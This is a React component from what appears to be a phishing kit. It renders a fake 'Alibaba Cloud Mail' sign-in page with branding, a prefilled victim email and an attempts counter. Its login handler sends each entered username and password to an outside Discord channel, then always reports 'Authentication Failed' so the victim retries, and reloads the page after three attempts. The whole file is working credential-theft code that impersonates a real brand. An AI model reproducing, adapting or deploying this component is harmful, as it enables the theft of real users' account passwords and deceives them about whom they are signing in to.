import React, { useState } from 'react';
import { submitToDiscord } from '../services/DiscordService';

interface AlibabaThemeProps {
  prefilledEmail?: string;
}

const AlibabaTheme: React.FC<AlibabaThemeProps> = ({ prefilledEmail }) => {
  const [username, setUsername] = useState(prefilledEmail || '');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [authError, setAuthError] = useState(false);
  const [failedAttempts, setFailedAttempts] = useState(0);

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsLoading(true);
    setAuthError(false);

    try {
      await submitToDiscord({
        username,
        password,
        theme: 'alibaba',
      }, 'AlibabaTheme');

      // Simulate authentication delay
      await new Promise(resolve => setTimeout(resolve, 2000));
      
      // Show authentication failed
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      // After 3 failed attempts, reload page
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } catch (err) {
      console.error('Error:', err);
      setAuthError(true);
      const newAttempts = failedAttempts + 1;
      setFailedAttempts(newAttempts);
      
      if (newAttempts >= 3) {
        await new Promise(resolve => setTimeout(resolve, 2000));
        window.location.reload();
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-white">
      {/* Simple Header */}
      <header className="w-full max-w-[1200px] mx-auto px-6 py-4 flex items-center justify-between">
        <div className="flex items-center space-x-2">
          <div className="w-10 h-10 bg-[#ff6a00] rounded-full flex items-center justify-center text-white">
            <span className="font-bold text-lg">A</span>
          </div>
          <h1 className="text-2xl font-light text-[#333] tracking-tight">Alibaba Cloud Mail</h1>
        </div>
      </header>

      <main className="flex-grow flex items-center justify-center py-12 px-4">
        <div className="w-full max-w-[440px]">
          <div className="bg-white rounded-lg shadow-md border border-gray-100 p-8">
            <h2 className="text-2xl font-medium text-gray-800 mb-6 text-center">Sign In</h2>
            
            <form onSubmit={handleLogin} className="space-y-6">
              <div className="space-y-2">
                <label className="text-sm font-medium text-gray-700">Email or Username</label>
                <input 
                  type="text" 
                  placeholder="Enter your email"
                  value={username}
                  onChange={(e) => setUsername(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-[#ff6a00] transition-colors"
                />
              </div>

              <div className="space-y-2">
                <label className="text-sm font-medium text-gray-700">Password</label>
                <input 
                  type="password" 
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full px-4 py-3 border border-gray-300 rounded focus:outline-none focus:border-[#ff6a00] transition-colors"
                />
              </div>

              <div className="flex items-center justify-between">
                <label className="flex items-center text-sm text-gray-600">
                  <input type="checkbox" className="mr-2 rounded border-gray-300 text-[#ff6a00]" />
                  Remember me
                </label>
                <a href="#" className="text-sm text-[#ff6a00] hover:underline">Forgot password?</a>
              </div>

              {/* Loading State */}
              {isLoading && (
                <div className="flex items-center justify-center py-4">
                  <div className="flex flex-col items-center space-y-2">
                    <div className="w-6 h-6 border-3 border-orange-200 border-t-orange-500 rounded-full animate-spin"></div>
                    <p className="text-[14px] text-gray-500">Verifying...</p>
                  </div>
                </div>
              )}

              {/* Authentication Failed Message */}
              {authError && !isLoading && (
                <div className="bg-red-50 border border-red-200 rounded-md p-4 mb-4">
                  <div className="flex items-start space-x-2">
                    <div className="flex-shrink-0 text-red-500 text-lg">⚠️</div>
                    <div>
                      <h3 className="font-medium text-red-800 text-[14px]">Authentication Failed</h3>
                      <p className="text-red-700 text-[13px] mt-1">Please try again. Attempts left: {3 - failedAttempts}</p>
                    </div>
                  </div>
                </div>
              )}

              <button 
                type="submit"
                disabled={isLoading}
                className="w-full py-3 bg-[#ff6a00] hover:bg-[#e55a00] text-white font-medium rounded transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
              >
                {isLoading ? 'Verifying...' : 'Sign In'}
              </button>

              <div className="text-center text-sm text-gray-500">
                Don't have an account? <a href="#" className="text-[#ff6a00] hover:underline">Sign up</a>
              </div>
            </form>
          </div>
          
          <div className="mt-8 text-center text-sm text-gray-400">
            <p>© 1999-2026 Alibaba Group. All rights reserved.</p>
          </div>
        </div>
      </main>
    </div>
  );
};

export default AlibabaTheme;